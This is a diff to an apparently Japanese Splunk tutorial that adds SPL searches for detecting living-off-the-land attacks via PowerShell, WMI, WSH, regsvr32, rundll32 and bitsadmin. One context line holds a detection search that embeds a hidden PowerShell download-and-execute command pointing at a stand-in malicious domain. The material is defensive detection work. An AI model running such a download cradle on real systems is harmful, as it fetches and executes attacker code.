@@ -6,8 +6,9 @@ Splunkは、機械データの収集、インデクシング、検索、可視�
 1. [Splunkの概要](#splunkの概要)
 2. [データのインデクシング](#データのインデクシング)
 3. [データの検索](#データの検索)
- -  [CobaltStrikeのログ検索](#CobaltStrikeのログ検索)
 - [Webサーバへの攻撃の検索](#Webサーバへの攻撃の検索)
+-  [CobaltStrikeのログ検索](#CobaltStrikeのログ検索)
+- [LOTL攻撃の検出](#LOTL攻撃の検出)
 4. [ダッシュボードと可視化](#ダッシュボードと可視化)
 5. [アラートの設定](#アラートの設定)
 6. [レポートの作成](#レポートの作成)
@@ -279,7 +280,6 @@ Cobalt Strikeが実行するコマンドやアクティビティを検出する�
 index=sysmon_logs | search "cmdline=\"powershell -nop -w hidden -c iex (New-Object Net.WebClient).DownloadString('http://maliciousdomain.com/payload')\""
 ```
 
-
 Cobalt Strikeのイベントログ検索
 
 1. Sysmonログでの検出
@@ -351,6 +351,63 @@ Cobalt StrikeのC2サーバーがDNSトンネリングを使用する場合が�
 index=dns_logs | timechart span=1m count by query | where count > 100
 ```
 
+# LOTL攻撃の検出
+
+## PowerShellを使用したLOTL攻撃の検出
+
+PowerShellを使用したコマンド実行や、スクリプトのロードに関連するイベントを検出します。
+
+```spl
+index=your_index sourcetype=your_sourcetype (powershell OR "Invoke-Expression" OR "IEX" OR "Invoke-WebRequest")
+| table _time host user parent_process_name process_name process_id command_line
+```
+
+## Windows Management Instrumentation (WMI)を使用したLOTL攻撃の検出
+
+WMIを利用したプロセスの起動を検出します。
+
+```spl
+index=your_index sourcetype=your_sourcetype EventCode=4688 (process_name="wmic.exe" OR command_line="*wmic*")
+| table _time host user process_id parent_process_name command_line
+```
+
+## Windows Scripting Host (WSH)を使用したLOTL攻撃の検出
+
+WSHを使用したスクリプトの実行を検出します。
+
+```spl
+index=your_index sourcetype=your_sourcetype (process_name="cscript.exe" OR process_name="wscript.exe")
+| table _time host user process_name process_id parent_process_name command_line
+```
+
+## Regsvr32を使用したLOTL攻撃の検出
+
+Regsvr32を使用してマルウェアを実行する攻撃を検出します。
+
+```spl
+index=your_index sourcetype=your_sourcetype process_name="regsvr32.exe"
+| table _time host user process_name process_id parent_process_name command_line
+```
+
+## rundll32を使用したLOTL攻撃の検出
+
+rundll32を利用したDLLの実行を検出します。
+
+```spl
+index=your_index sourcetype=your_sourcetype process_name="rundll32.exe"
+| table _time host user process_name process_id parent_process_name command_line
+```
+
+## Bitsadminを使用したLOTL攻撃の検出
+
+Bitsadminを利用したファイルのダウンロードやジョブの作成を検出します。
+
+```spl
+index=your_index sourcetype=your_sourcetype process_name="bitsadmin.exe"
+| table _time host user process_name process_id parent_process_name command_line
+```
+
+---
 
 
 
